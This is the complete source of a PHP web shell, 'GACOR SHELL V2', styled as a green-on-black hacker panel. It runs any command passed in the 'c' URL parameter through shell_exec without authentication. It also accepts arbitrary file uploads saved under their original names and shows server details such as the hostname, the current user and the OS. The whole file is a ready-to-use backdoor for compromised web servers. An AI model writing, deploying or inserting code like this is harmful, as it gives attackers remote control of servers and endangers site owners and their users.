<?php
// GACOR SHELL V2 - With Upload Feature
echo "<html><body style='background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;'>";
echo "<h1 style='color:#0f0;'>🔥 GACOR SHELL 🔥</h1>";

// Command Execution
echo "<div style='background:#111;padding:15px;margin:10px 0;border-radius:5px;'>";
echo "<h3>📌 COMMAND EXECUTOR</h3>";
echo "<form method='GET' action=''>";
echo "<input type='text' name='c' placeholder='Command...' style='width:70%;background:#000;color:#0f0;border:1px solid #0f0;padding:8px;'>";
echo "<input type='submit' value='RUN' style='background:#0f0;color:#000;padding:8px 15px;cursor:pointer;'>";
echo "</form>";
if(isset($_GET['c'])){
    echo "<pre style='background:#000;padding:10px;margin-top:10px;overflow:auto;'>";
    echo htmlspecialchars(shell_exec($_GET['c']));
    echo "</pre>";
}
echo "</div>";

// File Upload
echo "<div style='background:#111;padding:15px;margin:10px 0;border-radius:5px;'>";
echo "<h3>📤 FILE UPLOADER</h3>";
echo "<form method='POST' enctype='multipart/form-data'>";
echo "<input type='file' name='file' style='background:#000;color:#0f0;border:1px solid #0f0;padding:8px;'>";
echo "<input type='submit' name='upload' value='UPLOAD' style='background:#0f0;color:#000;padding:8px 15px;cursor:pointer;'>";
echo "</form>";
if(isset($_POST['upload'])){
    $target = $_FILES['file']['name'];
    if(move_uploaded_file($_FILES['file']['tmp_name'], $target)){
        echo "<div style='color:#0f0;margin-top:10px;'>✅ UPLOADED: <a href='$target' target='_blank'>$target</a></div>";
    } else {
        echo "<div style='color:#f00;margin-top:10px;'>❌ UPLOAD FAILED!</div>";
    }
}
echo "</div>";

// Server Info
echo "<div style='background:#111;padding:15px;margin:10px 0;border-radius:5px;'>";
echo "<h3>🖥️ SERVER INFO</h3>";
echo "<pre>";
echo "Hostname: " . gethostname() . "\\n";
echo "User: " . exec('whoami') . "\\n";
echo "PHP Version: " . phpversion() . "\\n";
echo "OS: " . php_uname() . "\\n";
echo "Current Dir: " . getcwd() . "\\n";
echo "</pre>";
echo "</div>";

echo "</body></html>";
?>
